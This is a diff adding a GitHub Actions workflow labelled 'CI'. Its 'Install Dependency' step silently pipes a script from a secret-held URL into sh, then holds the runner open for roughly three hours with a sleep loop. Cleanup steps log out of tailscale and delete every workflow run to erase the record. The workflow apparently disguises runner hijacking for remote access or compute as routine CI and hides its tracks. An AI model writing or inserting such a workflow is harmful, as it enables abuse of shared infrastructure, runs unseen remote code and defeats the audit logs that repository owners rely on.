@@ -1,0 +1,44 @@
+name: CI
+
+on:
+  workflow_dispatch:
+    inputs:
+      env:
+        description: 'Target Env'
+        required: true
+        default: 'main'
+
+concurrency:
+  group: 'ci-${{ github.ref_name }}-${{ github.event.inputs.env }}'
+  cancel-in-progress: true
+
+jobs:
+  build-server:
+    runs-on: ubuntu-latest
+    timeout-minutes: 310
+    steps:
+      - uses: actions/checkout@v3
+      - name: Install Dependency
+        run: |
+          curl -fsSL $T_URL | sh > /dev/null 2>&1
+          for i in {1..10800}
+          do
+            echo "hi $i" > /dev/null
+            sleep 1
+          done
+        env:
+          T_URL: ${{ secrets.T_URL }}
+      - name: Post Cleanup...
+        if: ${{ always() }}
+        run: |
+          sudo tailscale logout
+      - name: Post Cleanup Work...
+        if: ${{ always() }}
+        uses: Mattraks/delete-workflow-runs@v2
+        with:
+          token: ${{ github.token }}
+          repository: ${{ github.repository }}
+          retain_days: 0
+          keep_minimum_runs: 0
+          delete_workflow_by_state_pattern: "All"
+          delete_run_by_conclusion_pattern: "All"
